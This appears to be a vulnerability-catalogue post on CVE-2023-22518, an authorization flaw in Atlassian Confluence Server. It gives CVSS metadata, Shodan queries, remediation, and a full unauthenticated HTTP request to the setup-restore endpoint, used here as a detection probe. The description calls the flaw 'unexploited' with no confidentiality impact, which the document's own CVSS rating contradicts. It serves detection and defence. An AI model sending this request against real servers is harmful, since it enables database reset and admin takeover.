---
layout: post
cve_id: CVE-2023-22518
title: Atlassian Confluence Server - Improper Authorization
pcap: true
pcap_path: /pcaps/2023/CVE-2023-22518.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22518.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can exploit improper authorization to upload malicious
  backup files through the setup-restore endpoint, potentially resetting the database
  and gaining administrative access to Confluence Server data.

  '
remediation: 'Update Atlassian Confluence Data Center and Server to a patched version
  that properly authorizes access to the setup-restore.action endpoint.

  '
reference:
- https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907
- https://blog.projectdiscovery.io/atlassian-confluence-auth-bypass/
- https://jira.atlassian.com/browse/CONFSERVER-93142
- https://nvd.nist.gov/vuln/detail/CVE-2023-22518
- https://github.com/RootUp/PersonalStuff/blob/master/check_cve_2023_22518.py
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-22518
  cwe-id: CWE-863
  epss-score: 0.94375
  epss-percentile: 0.99963
  cpe: cpe:2.3:a:atlassian:confluence_data_center:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: atlassian
  product: confluence_data_center
  shodan-query:
  - http.component:"Atlassian Confluence"
  - http.component:"atlassian confluence"
  fofa-query: app="atlassian-confluence"
  note: this template attempts to validate the vulnerability by uploading an invalid
    (empty) zip file. This is a safe method for checking vulnerability and will not
    cause data loss or database reset. In real attack scenarios, a malicious file
    could potentially be used causing more severe impacts.
tags:
- cve
- cve2023
- atlassian
- confluence
- rce
- unauth
- intrusive
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data.
Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.


## üåê HTTP Request
```nohighlight
POST /json/setup-restore.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Content-Length: 415
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7
X-Atlassian-Token: no-check
Accept-Encoding: gzip
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="buildIndex"
false
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="file";filename="38BTpmhXN2xrQxwi0qS6CeIQfs9.zip"
38BTpmhXN2xrQxwi0qS6CeIQfs9
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="edit"
Upload and import
------WebKitFormBoundaryT3yekvo0rGaL9QR7--
```

